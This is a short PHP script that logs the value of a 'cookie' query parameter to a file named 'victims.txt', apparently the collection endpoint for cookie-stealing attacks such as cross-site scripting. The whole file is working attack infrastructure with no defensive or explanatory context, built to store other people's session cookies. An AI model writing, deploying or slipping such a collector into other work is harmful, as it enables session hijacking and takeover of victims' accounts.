<?php

if(isset($_GET["cookie"])){
	$file = fopen('victims.txt', 'a');
	fwrite($file, $_GET["cookie"]."\n");
	fclose($file);
}
